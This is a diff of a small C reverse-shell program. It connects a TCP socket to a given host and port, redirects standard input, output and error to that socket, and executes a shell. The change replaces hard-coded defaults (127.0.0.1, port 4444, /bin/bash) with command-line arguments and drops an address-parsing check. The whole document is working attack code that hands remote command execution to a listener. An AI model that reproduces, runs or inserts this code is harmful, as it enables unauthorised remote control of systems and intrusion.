@@ -2,19 +2,15 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 
-#ifndef HOST
-#define HOST "127.0.0.1"
-#endif
-
-#ifndef PORT
-#define PORT 4444
-#endif
-
-#ifndef SHELL
-#define SHELL "/bin/bash"
-#endif
-
 int main(int argc, char *argv[]) {
+    if (argc != 4) {
+        exit(1);
+    }
+
+    const char *host = argv[1];
+    int port = atoi(argv[2]);
+    const char *shell = argv[3];
+
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == -1) {
         exit(1);
@@ -22,11 +18,8 @@ int main(int argc, char *argv[]) {
 
     struct sockaddr_in server_addr;
     server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(PORT);
-    if (inet_pton(AF_INET, HOST, &server_addr.sin_addr) <= 0) {
-        close(sock);
-        exit(1);
-    }
+    server_addr.sin_port = htons(port);
+    inet_pton(AF_INET, host, &server_addr.sin_addr);
 
     if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
         close(sock);
@@ -37,7 +30,7 @@ int main(int argc, char *argv[]) {
     dup2(sock, 1);
     dup2(sock, 2);
 
-    execl(SHELL, SHELL, NULL);
+    execl(shell, shell, NULL);
     
     close(sock);
     return 0;
